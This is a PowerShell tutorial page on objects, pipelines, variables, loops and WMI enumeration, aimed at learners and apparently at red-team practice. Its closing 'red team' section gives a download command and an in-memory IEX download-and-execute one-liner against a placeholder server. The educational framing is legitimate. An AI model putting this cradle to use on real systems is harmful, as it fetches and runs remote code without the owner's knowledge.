---
title: "PowerShell"
topic: "powershell"
tags: [powershell, windows, scripting, automation, wmi, enumeration]
difficulty: intermediate
day: 27
layout: default
parent: Topics
nav_order: 27
---

# PowerShell

## What You Will Learn
- How PowerShell's object-based pipeline works
- How to explore objects using `Get-Member` and `Format-List`
- How to use environment variables, loops, and conditions
- How to run practical enumeration commands against Windows systems

## What Is It?

PowerShell is a task automation and configuration management framework from Microsoft. Unlike traditional command-line shells (which work with text), PowerShell works with **.NET objects** — this makes it far more powerful for scripting and automation.

PowerShell is widely used by both system administrators and attackers. Many red team tools (like Empire, PowerView, and Invoke-Mimikatz) are written in PowerShell.

## Key Concepts

### Understanding Attributes, Properties, and Methods

In PowerShell, everything is an object. Every object has:
- **Properties**: Data stored in the object (like a file's name or size).
- **Methods**: Actions the object can perform (like deleting itself).

### Get Properties, Attributes, and Methods of an Object

Any command that produces object-based output can be piped to `Get-Member`:

```powershell
Get-Process | Get-Member

# Get all properties of an object
Get-Process | Format-List -Property *
```

### Get Help for a Command

```powershell
Get-Help <command>
# Example:
Get-Help Get-Process
```

### Select Specific Properties

```powershell
Get-Process | Select-Object -Property Name, CPU, Id
```

### Environmental Variables

```powershell
# List all environment variables
Get-ChildItem Env:

# Get a specific variable (e.g., processor architecture)
$env:PROCESSOR_ARCHITECTURE
```

Reference: https://shellgeek.com/powershell-print-environment-variables/

### Piping

```powershell
Get-ChildItem | Measure-Object
```

### Loops

```powershell
For ($i = 0; $i -le 100; $i++) {
    Write-Output "Iteration: $i"
}
```

### Conditions

```powershell
if ($box -lt 3) {
    Write-Output "Less than 3"
}
```

### Variables

```powershell
$box = "olamide"
$box    # prints "olamide"
```

## Practical Examples

### Get the 8th Word from a Service Description

```powershell
((Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'").Description).split(' ')[7]
```

### Count Occurrences of a Word in a File

```powershell
# Count the number of times "polo" appears as a whole word in countpolos.txt
((Get-Content .\countpolos).split(' ') | Select-String "^polo$").count
```

### Useful WMI Classes for Enumeration

```powershell
# Get operating system info
Get-WmiObject -Class Win32_OperatingSystem

# Get BIOS info
Get-WmiObject -Class Win32_Bios

# Get running services
Get-WmiObject -Class Win32_Service

# Get running processes
Get-WmiObject -Class Win32_Process
```

### Download a File (Common in Red Team)

```powershell
# Download and execute a script from a URL (awareness — not for malicious use)
Invoke-WebRequest -Uri "http://server/script.ps1" -OutFile "C:\script.ps1"

# One-liner to run a remote script in memory
IEX (New-Object Net.WebClient).DownloadString("http://server/script.ps1")
```

## Resources

- [Microsoft PowerShell Docs](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/03-discovering-objects?view=powershell-7.4)
- [TryHackMe — PowerShell Room](https://tryhackme.com/room/powershell)
- [SS64 — PowerShell Reference](https://ss64.com/ps/)
- [HackTricks — PowerShell for Pentesters](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters)
